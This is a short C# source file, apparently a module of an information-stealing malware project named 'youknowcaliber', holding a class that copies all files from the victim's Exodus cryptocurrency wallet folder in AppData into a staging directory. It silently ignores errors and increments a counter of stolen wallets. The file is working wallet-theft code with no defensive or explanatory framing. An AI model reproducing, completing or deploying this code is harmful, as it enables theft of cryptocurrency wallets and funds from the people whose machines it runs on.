﻿using System;
using System.IO;

namespace youknowcaliber
{
	internal class Exodus
	{
		public static void ExodusStr(string directorypath)
		{
			try
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(Help.AppData + "\\Exodus\\exodus.wallet\\").GetFiles())
				{
					Directory.CreateDirectory(directorypath + Exodus.ExodusDir);
					fileInfo.CopyTo(directorypath + Exodus.ExodusDir + fileInfo.Name);
				}
				Exodus.count++;
				Counting.Wallets++;
			}
			catch
			{
			}
		}

		public static int count = 0;

		public static string ExodusDir = "\\Wallets\\Exodus\\";
	}
}
